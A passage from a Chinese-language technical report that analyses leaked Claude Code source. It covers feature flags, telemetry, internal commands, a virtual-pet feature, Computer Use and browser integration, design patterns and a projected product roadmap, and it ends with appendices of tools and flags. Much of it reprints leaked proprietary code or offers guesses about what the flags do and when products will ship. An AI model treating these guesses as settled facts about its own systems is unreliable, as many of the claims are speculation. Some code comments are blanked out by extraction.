+• PROFILE_SCOPE — 用户身份
+23.5 GrowthBook灰度发布
+services/analytics/growthbook.ts集成了GrowthBook特性门控和A/B测试：
+用户维度属性：
+export type GrowthBookUserAttributes = { id: string sessionId: string deviceID: string platform:
+'win32' | 'darwin' | 'linux' apiBaseUrlHost?: string organizationUUID?: string accountUUID?:
+string userType?: string subscriptionType?: string rateLimitTier?: string firstTokenTime?:
+number email?: string appVersion?: string github?: GitHubActionsMetadata }
+这些维度允许极其精细的灰度控制：
+• 按平台（仅macOS用户）
+• 按组织（仅特定企业）
+• 按订阅类型（仅Pro/Max用户）
+• 按Rate Limit层级
+• 按GitHub Actions环境
+特性门控在整个代码库中被广泛使用——tengu_session_memory、tengu_harbor、tengu_brief、tengu_o
+nyx_plover、tengu_ccr_bridge_multi_session等。所有门控名称都以tengu为前缀，这可能是一个内部
+代号。
+23.6 分析与遥测
+分析系统包含多个层次：
+GrowthBook：特性标志和A/B测试 Datadog：APM和日志（datadog.ts） 第一方事件日志：
+• firstPartyEventLogger.ts — 事件记录
+• firstPartyEventLoggingExporter.ts — 事件导出
+• PII保护：不记录代码内容和文件路径
+• 事件采样：高频事件按比例采样，避免数据爆炸
+实验追踪：
+• 实验ID（experimentId）、变体ID（variationId）、哈希值（hashValue）
+• 曝光日志按会话去重（同一实验在同一会话中只记录一次曝光）
+• 强制特性用于测试环境
+
+--- Page 70 ---
+Claude Code 0331 系统报告
+第23章 · 企业功能
+—  70  —
+公众号：手工川
+2026-04-01
+第十部分：隐藏特性与彩蛋
+
+--- Page 71 ---
+Claude Code 0331 系统报告
+第十部分：隐藏特性与彩蛋
+—  71  —
+公众号：手工川
+2026-04-01
+第24章 · 隐藏命令完整清单
+24.1 命令总览
+Claude Code的命令系统包含103个命令目录，涵盖：
+基础命令：clear、exit、help、usage、status、version
+会话管理：resume、session、rename、tag、summary
+代码工具：review、brief、commit、commit-push-pr、diff、advisor
+AI功能：agents、tasks、memory、thinking（thinkback、thinkback-play）
+开发工具：doctor、debug-tool-call、insights、issue、bughunter
+集成：bridge、chrome、desktop、remote-env、mobile、oauth-refresh
+插件系统：plugin、reload-plugins、mcp、skills、hooks
+配置：config、privacy-settings、permissions、keybindings、theme、color
+高级功能：teleport、smooth-streaming、custom 
+MCP、remote-setup
+测试/内部：ant-trace、break-cache、mock-limits、heapdump、perf-issue
+24.2 ANT-Only内部命令
+以下命令仅供Anthropic内部使用：
+bridge-kick — Bridge故障注入测试工具：
+/bridge-kick close 1002 —   WebSocket   /bridge-kick poll 404 —       404 /bridge-kick register
+fail —        /bridge-kick reconnect —        /bridge-kick status —   Bridge  ant-trace — 内部追踪系统（103个文件） heapdump — 堆内存快照（用于内存泄漏调试） mock-limits —
+模拟策略限制（测试企业功能） perf-issue — 性能问题分析 debug-tool-call — 工具调用调试
+24.3 已禁用命令考古
+部分命令在源码中存在但已被禁用：
+• good-claude — 可能是一个正面反馈机制（"Good Claude!"）
+• teleport — 会话传送功能（将会话从一个环境移动到另一个）
+• ctx_viz — 上下文可视化工具（图形化展示上下文窗口的使用情况）
+这些命令的存在暗示了Anthropic正在探索但尚未公开的功能方向。
+24.4 趣味命令
+• stickers — 贴纸系统
+
+--- Page 72 ---
+Claude Code 0331 系统报告
+第24章 · 隐藏命令完整清单
+—  72  —
+公众号：手工川
+2026-04-01
+• passes — 内部通行证系统
+• thinkback / thinkback-play — 思维回放：回放Claude的思考过程
+24.5 高级命令
+• ultraplan — 超级规划模式（更深度的任务分析和规划）
+• bughunter — Bug猎人（自动化Bug搜索）
+• voice — 语音模式
+• fast — 快速模式（可能使用更轻量的模型）
+• effort — 努力级别控制
+• vim — Vim模式（启用Vim键绑定）
+
+--- Page 73 ---
+Claude Code 0331 系统报告
+第24章 · 隐藏命令完整清单
+—  73  —
+公众号：手工川
+2026-04-01
+第25章 · Buddy虚拟宠物系统
+25.1 Bones（骨架）：确定性生成
+buddy/目录实现了一个完整的虚拟宠物系统。最独特的设计是"确定性哈希生成"——每个用户的宠物不
+是随机生成的，而是从用户ID确定性派生的。这意味着：
+• 同一用户永远拥有相同的宠物
+• 宠物是用户身份的"视觉指纹"
+• 没有保存/加载机制——宠物从用户ID实时计算
+18种物种和5级稀有度构成了宠物的"骨架"（Bones）。物种和稀有度的分配由用户ID的哈希值决定，稀
+有度越高的物种出现概率越低。
+稀有度颜色通过RARITY_COLORS枚举定义，从常见到传说：
+• Common（常见）
+• Uncommon（不常见）
+• Rare（稀有）
+• Epic（史诗）
+• Legendary（传说）
+25.2 Soul（灵魂）：学习型个性
+如果说Bones是宠物的外表，Soul则是宠物的"个性"。与确定性的Bones不同，Soul是学习型的——它会
+根据用户的使用模式逐渐发展出独特的个性属性。
+25.3 CompanionSprite：动画系统
+CompanionSprite组件实现了宠物的终端动画：
+const TICK_MS = 500 //       const BUBBLE_SHOW = 20 //          ~10   const FADE_WINDOW = 6 //
+       ~3   const PET_BURST_MS = 2500 //          空闲动画序列：
+const IDLE_SEQUENCE = [0, 0, 0, 0, 1, 0, 0, 0, -1, 0, 0, 2, 0, 0, 0] // 0 =   , 1-2 =    , -1 =
+ 0   抚摸效果（/buddy pet命令触发）：
+♥ ♥ ♥ ♥ ♥ ♥ ♥ ♥ ♥ ♥ ♥ · · ·
+5帧心形浮动动画，持续约2.5秒。
+
+--- Page 74 ---
+Claude Code 0331 系统报告
+第25章 · Buddy虚拟宠物系统
+—  74  —
+公众号：手工川
+2026-04-01
+25.4 设计哲学
+在一个严肃的CLI开发工具中放入虚拟宠物系统，这是一个大胆的设计决策。但从产品心理学角度看，
+这有多重意义：
+• 情感连接：用户与工具建立情感纽带，增加留存
+• 身份认同：确定性生成的宠物成为用户的"数字分身"
+• 压力缓解：在高压的编码工作中提供轻松的互动
+• 社交货币：稀有宠物成为用户之间的谈资
+
+--- Page 75 ---
+Claude Code 0331 系统报告
+第25章 · Buddy虚拟宠物系统
+—  75  —
+公众号：手工川
+2026-04-01
+第26章 · Computer Use与浏览器集成
+26.1 Computer Use MCP系统
+utils/computerUse/（15文件/2,161行）将鼠标、键盘和截屏操作封装为MCP工具。
+底层实现分为两个原生模块：
+• Rust/enigo (@ant/computer-use-input) — 鼠标移动、点击、拖拽；键盘输入；前台应用检测
+• Swift (@ant/computer-use-swift) —
+SCContentFilter截屏（隐私感知）；NSWorkspace应用列表；TCC权限管理
+关键设计决策：
+const SCREENSHOT_JPEG_QUALITY = 0.75
+截屏使用75%质量的JPEG压缩，在图像质量和传输大小之间取得平衡。
+安全特性：
+• 独占访问互斥锁（computerUseLock.ts）：防止多个工具并发控制鼠标/键盘
+• ESC热键（escHotkey.ts）：通过CGEventTap实现紧急中断——用户按ESC即可立即停止Computer
+Use操作
+• 终端代理（getTerminalBundleId()）：豁免终端窗口的截屏捕获
+• 隐私截屏：Swift的ContentFilter支持排除敏感窗口
+剪贴板操作通过pbcopy/pbpaste实现（而非Electron的clipboard模块），因为CLI环境没有Electron：
+async function readClipboardViaPbpaste(): Promise<string> { const { stdout, code } = await
+execFileNoThrow('pbpaste', [], { useCwd: false, }) if (code !== 0) throw new Error(`pbpaste
+exited with code ${code}`) return stdout }
+CFRunLoop Pump（drainRunLoop.ts）是macOS特有的需求——Swift的某些API（如截屏）需要主线程的
+RunLoop被驱动。这在CLI环境中不是自动的，需要手动Pump。
+26.2 Chrome浏览器集成
+utils/claudeInChrome/（7文件/2,337行）实现了与Chrome浏览器的深度集成。
+Native Host Messaging协议：
+const CHROME_EXTENSION_RECONNECT_URL = 'https://clau.de/chrome/reconnect' const
+NATIVE_HOST_IDENTIFIER = 'com.anthropic.claude_code_browser_extension'
+启用逻辑：
+export function shouldEnableClaudeInChrome(chromeFlag?: boolean): boolean { if
+(getIsNonInteractiveSession() && chromeFlag !== true) { return false //            } if
+(isEnvTruthy(process.env.CLAUDE_CODE_ENABLE_CFC)) { return true //          } return
+getFeatureValue_CACHED_MAY_BE_STALE('claude_in_chrome') }
+
+--- Page 76 ---
+Claude Code 0331 系统报告
+第26章 · Computer Use与浏览器集成
+—  76  —
+公众号：手工川
+2026-04-01
+架构：
+• 通过Chrome的Native Host Messaging API建立CLI与浏览器扩展的通信
+• 支持macOS和Windows平台
+• 多浏览器支持（Chrome、Edge、Brave等）
+• 便携模式用于沙箱环境
+Cloud Bridge — 除了本地Native Messaging外，还有一条Cloud路径通过wss://bridge.claudeusercontent
+.com进行WebSocket通信，这允许远程Bridge会话控制浏览器。
+这意味着KAIROS自主Agent理论上可以通过Cloud Bridge操控用户的浏览器——打开网页、填写表单、抓
+取信息——这是一个极其强大但也需要极其谨慎的能力。
+
+--- Page 77 ---
+Claude Code 0331 系统报告
+第26章 · Computer Use与浏览器集成
+—  77  —
+公众号：手工川
+2026-04-01
+第十一部分：工程实践与设计哲学
+
+--- Page 78 ---
+Claude Code 0331 系统报告
+第十一部分：工程实践与设计哲学
+—  78  —
+公众号：手工川
+2026-04-01
+第27章 · 关键设计模式
+27.1 编译时死代码消除
+这是Claude 
+Code最核心的工程创新之一。通过Bun打包器的bun:bundle模块，Claude
+Code在编译时而非运行时进行特性判断：
+import { feature } from 'bun:bundle' if (feature('KAIROS')) { //       KAIROS          const
+kairosModule = require('./kairos') }
+与传统的运行时特性标志（if-else判断）相比，编译时消除有显著优势：
+• 更小的包体积：未启用的功能代码完全不存在于产物中
+• 无运行时开销：不需要条件判断
+• 安全性：内部功能代码不会泄露到外部构建中（讽刺的是，Source Map绕过了这一保护）
+• 树摇优化：依赖链自动清理
+89个特性标志（其中16个主要标志）使Claude 
+Code能从单一代码库构建出多种产品形态：面向消费者
+的CLI、企业版、KAIROS自主Agent、Bridge服务器、Coordinator编排器等。
+27.2 Lazy Require打破循环依赖
+大型TypeScript项目的经典问题——模块间循环依赖——在Claude 
+Code中通过延迟require（Lazy
+Require）解决：
+//       import        require function someFunction() { const { SomeDependency } =
+require('./dependency') //   SomeDependency }
+这种模式打破了循环依赖链：A→B→C→A变成了A→B→C→(lazy)A，因为在C真正需要A时，A已经完成了
+初始化。
+在代码库中，这个模式出现了数百次，主要集中在：
+• 大型模块（main.tsx, query.ts）与其依赖之间
+• 工具实现与工具注册系统之间
+• UI组件与状态管理之间
+27.3 Forked Agent模式
+Claude Code开创了一种"状态分叉"的后台任务执行模式：
+1. 主Agent的状态（消息历史、文件缓存、prompt cache）被"分叉"
+2. 后台Agent在分叉状态的基础上独立执行
+3. 后台Agent的结果可以被合并回主状态（或丢弃）
+
+--- Page 79 ---
+Claude Code 0331 系统报告
+第27章 · 关键设计模式
+—  79  —
+公众号：手工川
+2026-04-01
+这个模式被用于：
+• Session Memory提取
+• Dream记忆巩固
+• Magic Docs更新
+• Extract Memories后台提取
+关键优势是共享prompt cache——后台Agent不需要重新构建上下文，直接复用主Agent的缓存。在Cache
+命中的情况下，后台Agent的首次调用成本接近于零。
+27.4 故障关闭（Fail-Closed）哲学
+Claude Code在安全关键路径上贯彻了"故障关闭"原则：
+• Bash安全检查：如果检查逻辑本身失败（例如正则匹配出错），默认拒绝执行
+• 权限决策：无法确定时默认询问用户
+• DXT解压：验证失败时拒绝安装
+但在非安全关键路径上采用了"故障开放"（Fail-Open）：
+• 策略限制：API获取失败时不阻塞，继续运行不受限
+• GrowthBook：特性标志加载失败时使用默认值
+• 分析日志：发送失败时静默丢弃
+这种"安全路径关闭、功能路径开放"的双重策略确保了系统在安全性和可用性之间的平衡。
+27.5 闭包状态管理
+Claude Code大量使用闭包来管理模块级别的可变状态，而非导出可变变量：
+//    export let counter = 0 //     export function createCounter() { let count = 0 return {
+increment: () => ++count, getCount: () => count, } }
+这确保了状态的封装性和可预测性，避免了模块间的状态泄漏。
+
+--- Page 80 ---
+Claude Code 0331 系统报告
+第27章 · 关键设计模式
+—  80  —
+公众号：手工川
+2026-04-01
+第28章 · 性能工程
+28.1 启动优化
+Claude Code的启动优化是工程的亮点：
+零导入版本检查（<5ms）：
+cli.tsx的快速路径在不加载任何模块的情况下处理--version请求，仅需文件系统读取。
+并行初始化：
+• MDM（Mobile Device Management）检查
+• 钥匙链（Keychain）读取
+• API预连接
+三者并行执行，避免串行等待。
+三阶段初始化： init() → setup() → main()，每个阶段只加载必需的依赖。
+28.2 渲染优化
+帧缓存：渲染结果被缓存，只有在状态变化时才重新渲染。
+DOM差异更新：计算最小化的ANSI输出序列。
+DECSTBM硬件滚动：利用终端的硬件滚动能力，避免重绘整个屏幕。
+FPS监控：内置性能监控，帮助识别渲染瓶颈。
+28.3 Token优化
+Token是Claude Code最昂贵的资源，优化策略包括：
+缓存断点：在消息历史中插入缓存断点，使后续请求能复用之前的prompt处理结果，节省高达90%的输
+入Token成本。
+微压缩：基于文件路径索引的精确缓存失效——当工具输出中包含文件内容时，如果文件未变化，使用
+索引引用替代全文内容。
+延迟工具加载：ToolSearchTool 
++
+关键词缓存允许工具定义按需加载，而非一次性加载全部54个工具的Schema到系统提示中。
+递减收益检测：连续3次压缩回收不足500 Token后自动禁用压缩，避免无意义的计算开销。
+28.4 内存管理
+
+--- Page 81 ---
+Claude Code 0331 系统报告
+第28章 · 性能工程
+—  81  —
+公众号：手工川
+2026-04-01
+InProcessTeammate 50消息上限：从"鲸鱼会话"（292个Agent/36.8GB）事件中汲取教训。
+消息历史100条上限：在某些模式下限制保留的历史消息数量。
+Screen缓冲区优化：StylePool的ANSI样式interning减少了终端输出生成过程中的内存分配。
+延迟模块加载：通过Lazy Require，未使用的模块不会占用内存。
+
+--- Page 82 ---
+Claude Code 0331 系统报告
+第28章 · 性能工程
+—  82  —
+公众号：手工川
+2026-04-01
+第十二部分：战略推演
+
+--- Page 83 ---
+Claude Code 0331 系统报告
+第十二部分：战略推演
+—  83  —
+公众号：手工川
+2026-04-01
+第29章 · Anthropic的产品路线图推演
+29.1 从源码结构推断的近期产品方向
+通过分析特性标志、隐藏命令和未完成的功能模块，可以推断Anthropic的近期产品方向：
+自主Agent产品（KAIROS）： 158处引用、6个子标志、专属工具链——KAIROS是代码库中除核心功能外
+投入最大的系统。完整的tick机制、Sleep/Wake周期、Channel集成都表明这不是概念验证，而是接近产
+品化的功能。
+语音模式（VOICE_MODE）： 独立的特性标志和VoiceProvider上下文表明语音交互正在积极开发中。vo
+ice命令的存在进一步证实了这一点。
+移动端（MOBILE）： mobile命令目录和相关特性标志暗示了移动端适配的工作。
+插件生态：
+完整的市场机制（marketplace）、DXT打包格式、后台安装系统——插件生态的基础设施已经成熟。
+29.2 KAIROS产品化时间线推演
+根据代码成熟度评估：
+• 基础设施就绪：tick机制、Sleep工具、权限集成  • 通信能力就绪：PushNotification、SendUserFile、BriefTool  • 外部集成就绪：Channel Notification（Slack/Discord）、GitHub Webhooks  • 记忆系统就绪：Dream巩固、Session Memory  尚未完善：
+• Channel功能仍受GrowthBook门控（tengu_harbor）
+• 企业准入仍需管理员明确启用
+• Tool目录部分缺失（可能在另一个构建产物中）
+预估KAIROS可能在2026年Q2-Q3以有限预览的形式向部分用户推出。
+29.3 Voice Mode的产品定位
+Voice Mode的存在暗示了Claude Code可能演进为一个"对话式编程助手"——开发者通过语音与Claude交
+流，Claude在终端中执行操作。这对于：
+• 会议中的实时代码演示
+• 无法使用键盘时的代码操作（如通勤途中通过手机控制远程开发环境）
+• 辅助功能（accessibility）
+
+--- Page 84 ---
+Claude Code 0331 系统报告
+第29章 · Anthropic的产品路线图推演
+—  84  —
+公众号：手工川
+2026-04-01
+29.4 插件生态的爆发条件
+插件生态爆发需要：
+• 稳定的API surface（DXT格式已标准化）
+• 活跃的市场（marketplace机制已就位）
+• 开发者工具（mcp-builder技能已存在）
+• 分发机制（后台安装 + 推荐系统）
+所有基础条件已具备，缺少的可能是一个标志性的第三方插件来引爆生态。
+29.5 企业版评估
+企业版功能的完善程度相当高：
+• 策略限制系统（工具禁用、Token速率限制）
+• 远程管理设置（签名验证、设置推送）
+• OAuth集成（PKCE、组织选择）
+• GrowthBook灰度发布（极精细的用户维度控制）
+• 分析遥测（PII保护、事件采样）
+
+--- Page 85 ---
+Claude Code 0331 系统报告
+第29章 · Anthropic的产品路线图推演
+—  85  —
+公众号：手工川
+2026-04-01
+第30章 · 竞争格局影响
+30.1 技术领先维度
+与主要竞品的对比：
+维度
+Claude Code
+Cursor
+Windsurf
+Cline
+Aider
+自主Agent
+KAIROS（完整）
+无
+有限
+无
+无
+多Agent
+3条技术路线
+无
+无
+无
+无
+记忆系统
+4层架构
+项目级
+项目级
+无
+无
+编译时优化
+bun:bundle特性标
+志
+无
+无
+无
+无
+终端UI
+自研Ink（19,842行
+）
+N/A（IDE）
+N/A（IDE）
+N/A（IDE）
+基础
+浏览器集成
+Native Host + Cloud
+无
+有限
+无
+无
+企业功能
+完整
+有限
+有限
+无
+无
+Computer Use
+Rust+Swift原生
+无
+无
+无
+无
+30.2 被泄露后的"被模仿风险"
+此次泄露使竞争对手能详细了解Claude Code的架构决策。可能被模仿的方面：
+容易复制：
+• 工具系统的Schema设计
+• 权限模型的三级制
+• 命令注册的Registry模式
+• 缓存断点策略
+难以复制：
+• KAIROS的完整生态（需要强大的底层模型支持）
+• Bun特性标志系统（需要Bun打包器的深度集成）
+• 19,842行的自研Ink框架（巨大的工程投入）
+• 四层记忆架构的Dream巩固机制（需要长期运行的Agent基础设施）
+30.3 护城河分析
+Claude Code的核心护城河不在于代码本身，而在于：
+
+--- Page 86 ---
+Claude Code 0331 系统报告
+第30章 · 竞争格局影响
+—  86  —
+公众号：手工川
+2026-04-01
+模型能力：Claude作为底层模型的能力决定了工具调用、代码理解和推理的质量。代码可以被复制，但
+模型能力不能。
+系统集成深度：Claude Code与Claude API的集成（缓存断点、流式处理、Beta特性）是其他工具无法简
+单复制的——这些API特性可能是Claude Code团队与模型团队共同设计的。
+工程积累：19,842行的Ink框架、25项Bash安全检查、35+条秘密扫描规则——这些是数月到数年工程实
+践的结晶。
+生态效应：一旦插件生态建立，网络效应将成为最强的护城河。
+数据飞轮：GrowthBook驱动的A/B测试和遥测数据形成了持续优化的飞轮，竞争对手即使拥有相同代码
+也无法获得这些数据。
+
+--- Page 87 ---
+Claude Code 0331 系统报告
+第30章 · 竞争格局影响
+—  87  —
+公众号：手工川
+2026-04-01
+附录
+
+--- Page 88 ---
+Claude Code 0331 系统报告
+附录
+—  88  —
+公众号：手工川
+2026-04-01
+附录A · 54个工具完整清单
+经过深入分析，最终确认Claude
+Code包含54个工具（含特性标志门控的条件工具），超出初步统计的44个。
+#
+工具名
+实现类
+门控条件
+功能描述
+1
+Agent
+AgentTool
+无
+启动子Agent执行复杂
+任务
+2
+AskUserQuestion
+AskUserQuestionTool
+无
+向用户提问并获取答案
+3
+Bash
+BashTool
+无
+执行Shell命令
+4
+Brief
+BriefTool
+KAIROS \
+\
+5
+Config
+ConfigTool
+无
+读写配置
+6
+CronCreate
+CronCreateTool
+AGENT_TRIGGERS
+创建定时触发器
+7
+CronDelete
+CronDeleteTool
+AGENT_TRIGGERS
+删除定时触发器
+8
+CronList
+CronListTool
+AGENT_TRIGGERS
+列出定时触发器
+9
+CtxInspect
+CtxInspectTool
+CONTEXT_COLLAPSE
+上下文检查
+10
+Edit
+FileEditTool
+无
+编辑文件
+11
+EnterPlanMode
+EnterPlanModeTool
+无
+进入计划模式
+12
+EnterWorktree
+EnterWorktreeTool
+Worktree模式
+进入Worktree
+13
+ExitPlanMode
+ExitPlanModeTool
+无
+退出计划模式
+14
+ExitWorktree
+ExitWorktreeTool
+Worktree模式
+退出Worktree
+15
+Glob
+GlobTool
+无（嵌入式搜索替代）
+文件模式匹配
+16
+Grep
+GrepTool
+无（嵌入式搜索替代）
+内容搜索
+17
+ListMcpResources
+ListMcpResourcesTool
+无
+列出MCP资源
+18
+ListPeers
+ListPeersTool
+UDS_INBOX
+列出对等节点
+19
+LSP
+LSPTool
+ENABLE_LSP_TOOL环境
+变量
+语言服务器协议工具
+20
+Monitor
+MonitorTool
+MONITOR_TOOL
+监控工具
+21
+NotebookEdit
+NotebookEditTool
+无
+编辑Jupyter Notebook
+22
+OverflowTest
+OverflowTestTool
+OVERFLOW_TEST_TOOL
+溢出测试（内部）
+23
+PowerShell
+PowerShellTool
+isPowerShellToolEnable
+d()
+PowerShell命令执行
+24
+PushNotification
+PushNotificationTool
+KAIROS \
+\
+25
+Read
+FileReadTool
+无
+读取文件
+26
+ReadMcpResource
+ReadMcpResourceTool
+无
+读取MCP资源
+27
+REPL
+REPLTool
+USER_TYPE=ant
+REPL交互执行
+
+--- Page 89 ---
+Claude Code 0331 系统报告
+附录A · 54个工具完整清单
+—  89  —
+公众号：手工川
+2026-04-01
+#
+工具名
+实现类
+门控条件
+功能描述
+28
+RemoteTrigger
+RemoteTriggerTool
+AGENT_TRIGGERS_REM
+OTE
+远程触发器
+29
+SendMessage
+SendMessageTool
+无
+发送消息给其他Agent
+30
+SendUserFile
+SendUserFileTool
+KAIROS
+向用户发送文件
+31
+Skill
+SkillTool
+无
+执行技能
+32
+Sleep
+SleepTool
+PROACTIVE \
+\
+33
+Snip
+SnipTool
+HISTORY_SNIP
+历史消息裁剪
+34
+StructuredOutput
+SyntheticOutputTool
+无
+结构化输出
+35
+SubscribePR
+SubscribePRTool
+KAIROS_GITHUB_WEBH
+OOKS
+GitHub PR订阅
+36
+SuggestBackgroundPR
+SuggestBackgroundPRT
+ool
+USER_TYPE=ant
+建议后台PR
+37
+Task
+TaskOutputTool
+无
+获取任务输出
+38
+TaskCreate
+TaskCreateTool
+Todo V2
+创建任务
+39
+TaskGet
+TaskGetTool
+Todo V2
+获取任务详情
+40
+TaskList
+TaskListTool
+Todo V2
+列出任务
+41
+TaskStop
+TaskStopTool
+无
+停止任务
+42
+TaskUpdate
+TaskUpdateTool
+Todo V2
+更新任务
+43
+TeamCreate
+TeamCreateTool
+AGENT_SWARMS
+创建团队
+44
+TeamDelete
+TeamDeleteTool
+AGENT_SWARMS
+删除团队
+45
+TerminalCapture
+TerminalCaptureTool
+TERMINAL_PANEL
+终端截获
+46
+TodoWrite
+TodoWriteTool
+无
+写入待办事项
+47
+ToolSearch
+ToolSearchTool
+乐观工具搜索启用
+搜索可用工具
+48
+Tungsten
+TungstenTool
+USER_TYPE=ant
+内部工具
+49
+VerifyPlanExecution
+VerifyPlanExecutionTool
+CLAUDE_CODE_VERIFY_
+PLAN环境变量
+计划执行验证
+50
+WebBrowser
+WebBrowserTool
+WEB_BROWSER_TOOL
+浏览器操作
+51
+WebFetch
+WebFetchTool
+无
+网页内容获取
+52
+WebSearch
+WebSearchTool
+无
+网络搜索
+53
+Workflow
+WorkflowTool
+WORKFLOW_SCRIPTS
+工作流脚本执行
+54
+Write
+FileWriteTool
+无
+写入文件
+
+--- Page 90 ---
+Claude Code 0331 系统报告
+附录A · 54个工具完整清单
+—  90  —
+公众号：手工川
+2026-04-01
+附录B · 89个特性标志完整清单
+#
+标志名
+推测功能
+1
+ABLATION_BASELINE
+消融基线实验
+2
+AGENT_MEMORY_SNAPSHOT
+Agent记忆快照
+3
+AGENT_TRIGGERS
+Agent触发器（Cron工具）
+4
+AGENT_TRIGGERS_REMOTE
+远程Agent触发器
+5
+AGENT_SWARMS
+Agent群组（Swarm系统）
+6
+ALLOW_TEST_VERSIONS
+允许测试版本
+7
+ANTI_DISTILLATION_CC
+反模型蒸馏保护
+8
+AUTO_THEME
+自动主题切换
+9
+AWAY_SUMMARY
+离开时摘要
+10
+BASH_CLASSIFIER
+Bash命令AI分类器
+11
+BG_SESSIONS
+后台会话
+12
+BREAK_CACHE_COMMAND
+缓存清除命令
+13
+BRIDGE_MODE
+Bridge远程控制模式
+14
+BUDDY
+虚拟宠物系统
+15
+BUILDING_CLAUDE_APPS
+构建Claude应用
+16
+BUILTIN_EXPLORE_PLAN_AGENTS
+内置探索/计划Agent
+17
+BYOC_ENVIRONMENT_RUNNER
+自带容器环境运行器
+18
+CACHED_MICROCOMPACT
+缓存微压缩
+19
+CCR_AUTO_CONNECT
+CCR自动连接
+20
+CCR_MIRROR
+CCR镜像
+21
+CCR_REMOTE_SETUP
+CCR远程设置
+22
+CHICAGO_MCP
+Chicago MCP方案
+23
+COMMIT_ATTRIBUTION
+提交归属信息
+24
+COMPACTION_REMINDERS
+压缩提醒
+25
+CONNECTOR_TEXT
+连接器文本
+26
+CONTEXT_COLLAPSE
+上下文折叠
+27
+COORDINATOR_MODE
+Coordinator多Agent模式
+28
+COWORKER_TYPE_TELEMETRY
+协作者类型遥测
+29
+DAEMON
+守护进程模式
+30
+DIRECT_CONNECT
+直连模式
+31
+DOWNLOAD_USER_SETTINGS
+下载用户设置
+32
+DUMP_SYSTEM_PROMPT
+导出系统提示
+
+--- Page 91 ---
+Claude Code 0331 系统报告
+附录B · 89个特性标志完整清单
+—  91  —
+公众号：手工川
+2026-04-01
+#
+标志名
+推测功能
+33
+ENHANCED_TELEMETRY_BETA
+增强遥测Beta
+34
+EXPERIMENTAL_SKILL_SEARCH
+实验性技能搜索
+35
+EXTRACT_MEMORIES
+记忆提取
+36
+FILE_PERSISTENCE
+文件持久化
+37
+FORK_SUBAGENT
+Fork子Agent
+38
+HARD_FAIL
+硬失败模式
+39
+HISTORY_PICKER
+历史选择器
+40
+HISTORY_SNIP
+历史裁剪
+41
+HOOK_PROMPTS
+Hook提示
+42
+IS_LIBC_GLIBC
+glibc检测
+43
+IS_LIBC_MUSL
+musl检测
+44
+KAIROS
+自主助手模式（主标志）
+45
+KAIROS_BRIEF
+KAIROS Brief工具
+46
+KAIROS_CHANNELS
+KAIROS外部渠道
+47
+KAIROS_DREAM
+KAIROS Dream记忆巩固
+48
+KAIROS_GITHUB_WEBHOOKS
+KAIROS GitHub Webhooks
+49
+KAIROS_PUSH_NOTIFICATION
+KAIROS推送通知
+50
+LODESTONE
+Lodestone系统
+51
+MCP_RICH_OUTPUT
+MCP富输出
+52
+MCP_SKILLS
+MCP技能
+53
+MEMORY_SHAPE_TELEMETRY
+记忆形态遥测
+54
+MESSAGE_ACTIONS
+消息操作
+55
+MONITOR_TOOL
+监控工具
+56
+NATIVE_CLIENT_ATTESTATION
+原生客户端认证
+57
+NATIVE_CLIPBOARD_IMAGE
+原生剪贴板图像
+58
+NEW_INIT
+新初始化流程
+59
+OVERFLOW_TEST_TOOL
+溢出测试工具
+60
+PERFETTO_TRACING
+Perfetto性能追踪
+61
+POWERSHELL_AUTO_MODE
+PowerShell自动模式
+62
+PROACTIVE
+主动模式
+63
+PROMPT_CACHE_BREAK_DETECTION
+Prompt缓存中断检测
+64
+QUICK_SEARCH
+快速搜索
+65
+REACTIVE_COMPACT
+响应式压缩
+66
+REVIEW_ARTIFACT
+审查产物
+67
+RUN_SKILL_GENERATOR
+运行技能生成器
+68
+SELF_HOSTED_RUNNER
+自托管运行器
+69
+SHOT_STATS
+镜头统计
+70
+SKILL_IMPROVEMENT
+技能改进
+
+--- Page 92 ---
+Claude Code 0331 系统报告
+附录B · 89个特性标志完整清单
+—  92  —
+公众号：手工川
+2026-04-01
+#
+标志名
+推测功能
+71
+SLOW_OPERATION_LOGGING
+慢操作日志
+72
+SSH_REMOTE
+SSH远程
+73
+STREAMLINED_OUTPUT
+流线化输出
+74
+TEAMMEM
+团队记忆
+75
+TEMPLATES
+模板系统
+76
+TERMINAL_PANEL
+终端面板
+77
+TOKEN_BUDGET
+Token预算
+78
+TORCH
+Torch系统
+79
+TRANSCRIPT_CLASSIFIER
+对话分类器
+80
+TREE_SITTER_BASH
+Tree-sitter Bash解析
+81
+TREE_SITTER_BASH_SHADOW
+Tree-sitter Bash影子模式
+82
+UDS_INBOX
+Unix Domain Socket收件箱
+83
+ULTRAPLAN
+超级计划模式
+84
+ULTRATHINK
+超级思考模式
+85
+UNATTENDED_RETRY
+无人值守重试
+86
+UPLOAD_USER_SETTINGS
+上传用户设置
+87
+VERIFICATION_AGENT
+验证Agent
+88
+VOICE_MODE
+语音模式
+89
+WEB_BROWSER_TOOL
+浏览器工具
+
+--- Page 93 ---
+Claude Code 0331 系统报告
+附录B · 89个特性标志完整清单
+—  93  —
+公众号：手工川
+2026-04-01
+附录C · 117个命令目录完整清单
+按功能分类：
+基础操作：clear, exit, help, usage, version.ts, status
+会话管理：resume, session, rename, tag, summary, share, export, compact, rewind, backfill-sessions
+代码工具：commit.ts, commit-push-pr.ts, diff, review, review.ts, brief.ts, advisor.ts, autofix-pr, pr_comments
+AI功能：agents, tasks, memory, plan, context, thinkback, thinkback-play, ultraplan.tsx
+开发工具：doctor, debug-tool-call, insights.ts, issue, bughunter, files, stats, cost
+集成：bridge, bridge-kick.ts, chrome, desktop, mobile, remote-env, remote-setup, oauth-refresh,
+install-github-app, install-slack-app, install.tsx
+插件/技能：plugin, reload-plugins, mcp, skills, hooks
+配置：config, privacy-settings, permissions, keybindings, theme, color, output-style, model, effort, fast, vim,
+statusline.tsx, sandbox-toggle
+高级功能：teleport, voice, btw, env, add-dir, branch, copy, feedback, ide, login, logout, onboarding,
+terminalSetup, upgrade, rate-limit-options, release-notes, reset-limits
+内部/测试：ant-trace, break-cache, mock-limits, heapdump, perf-issue, good-claude, passes, stickers,
+security-review.ts, init.ts, init-verifiers.ts, createMovedToPluginCommand.ts
+
+--- Page 94 ---
+Claude Code 0331 系统报告
+附录C · 117个命令目录完整清单
+—  94  —
+公众号：手工川
+2026-04-01
+附录D · 关键源文件索引（Top 30）
+排名
+行数
+文件路径
+功能描述
+1
+5,594
+cli/print.ts
+终端渲染引擎、命令处理、
+工具池管理
+2
+5,512
+utils/messages.ts
+消息处理、规范化、序列化
+3
+5,105
+utils/sessionStorage.ts
+会话存储、持久化、恢复
+4
+5,022
+utils/hooks.ts
+工具集Hooks、权限集成
+5
+5,005
+screens/REPL.tsx
+REPL主界面、交互循环
+6
+4,683
+main.tsx
